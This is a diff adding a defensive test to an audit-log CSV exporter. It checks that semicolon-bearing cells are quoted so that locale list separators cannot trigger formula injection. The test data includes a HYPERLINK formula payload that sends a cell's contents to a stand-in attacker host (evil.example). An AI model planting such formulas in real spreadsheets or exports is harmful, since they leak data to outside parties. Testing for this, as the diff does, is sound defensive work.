@@ -168,6 +168,23 @@ describe("authtempo audit export (plan 13b Task 8)", () => {
     }
   });
 
+  // Plan 13b, ruling R23: a spreadsheet with `;` as its list separator (de-DE, fr-FR) splits an
+  // unquoted line at `;`. The cell after the `;` would then start with `=` and run as a formula.
+  it("injection: a cell that holds a ; gets quotes, so a ; list separator does not split it", async () => {
+    for (const agent of ["x;=HYPERLINK(A2)", 'x;=HYPERLINK("https://evil.example/?"&A2,"open")']) {
+      const s = stub([row("a1", { userAgent: agent })], []);
+      const { code, io } = await run(["--organization", ORG, "--format", "csv"], s.fetch);
+      expect(code, io.stderr.join("\n")).toBe(0);
+      // The user agent is the last column, so the line ends with the quoted cell.
+      expect(io.stdout[1]?.endsWith(`,"${agent.replaceAll('"', '""')}"`), agent).toBe(true);
+      expect(readCsv(io.stdout.join("\n"))[1]?.[10]).toBe(agent);
+    }
+    // The formula guard still runs first: a cell that starts with `=` and holds a `;`.
+    const t = stub([row("a1", { userAgent: "=1;=2" })], []);
+    const r = await run(["--organization", ORG, "--format", "csv"], t.fetch);
+    expect(r.io.stdout[1]?.endsWith(`,"'=1;=2"`)).toBe(true);
+  });
+
   it("no format: a usage error with exit 2 and no request", async () => {
     for (const format of [[], ["--format", "xml"]]) {
       const s = stub([row("a1")], []);
